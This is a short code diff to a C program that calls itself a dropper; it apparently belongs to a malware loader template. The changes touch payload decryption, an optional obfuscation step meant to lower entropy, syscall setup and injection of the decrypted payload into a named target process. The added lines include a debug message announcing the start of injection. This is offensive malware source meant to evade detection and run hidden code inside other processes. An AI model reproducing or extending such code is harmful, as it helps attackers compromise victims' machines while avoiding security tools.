@@ -40,7 +40,7 @@ int main() {
     DebugPrint("Debug mode enabled.\n");
     DebugPrint("Dropper started...\n");
 
-    InitializeSyscalls();
+    InitializeApiFunctions();
 
 #ifdef ENTROPY_REDUCTION_ENABLED
     init_obfuscation();
@@ -67,9 +67,15 @@ SIZE_T PayloadSize = sizeof(Payload);
 
     if (!bSuccess) {
         DebugPrint("[X] Failed to decrypt payload.\n");
-       return 1;
+        return FALSE;
     }
 
+    if(!InitializeSyscalls()) {
+        DebugPrint("[X] Failed to initialize syscalls.\n");
+        return FALSE;
+    }
+
+    DebugPrint("[i] Setup complete... Beginning injection!\n");
 #ifdef PROCESS_NAME_ENABLED
     LPWSTR szProcessName =  /* PROCESS_NAME */;
     bSuccess = inject_payload(pDecryptedPayload, PayloadSize, szProcessName);
